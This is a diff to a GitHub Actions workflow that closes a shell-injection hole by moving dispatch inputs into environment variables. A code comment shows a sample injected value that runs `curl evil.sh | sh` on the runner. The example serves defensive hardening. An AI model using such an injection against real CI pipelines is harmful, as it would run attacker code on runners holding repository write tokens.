@@ -60,15 +60,22 @@ jobs:
             sol-cache-
 
       - name: Build data products
+        # Inputs reach the shell as ENVIRONMENT VARIABLES, never spliced into
+        # the script text. ${{ }} is substituted before bash parses the line,
+        # so a max_frames of `1"; curl evil.sh | sh; #` would execute on a
+        # runner that holds contents:write and GITHUB_TOKEN. Only someone with
+        # write access can dispatch this workflow, so it is not an escalation
+        # -- but it costs two lines to close and every scanner flags it.
+        env:
+          FORCE: ${{ inputs.force }}
+          MAX_FRAMES: ${{ inputs.max_frames }}
         run: |
           # --with-texture is ON here and off by default locally: it costs a
           # 700 KB download plus ~10 s of reprojection, and a failure is soft
           # (never changes the exit code, so it cannot block the publish).
           ARGS="all --out dist-data -v --with-texture"
-          if [ "${{ inputs.force }}" = "true" ]; then ARGS="$ARGS --force"; fi
-          if [ -n "${{ inputs.max_frames }}" ]; then
-            ARGS="$ARGS --max-frames ${{ inputs.max_frames }}"
-          fi
+          if [ "$FORCE" = "true" ]; then ARGS="$ARGS --force"; fi
+          if [ -n "$MAX_FRAMES" ]; then ARGS="$ARGS --max-frames $MAX_FRAMES"; fi
           python -m pipeline $ARGS
 
       - name: Validate
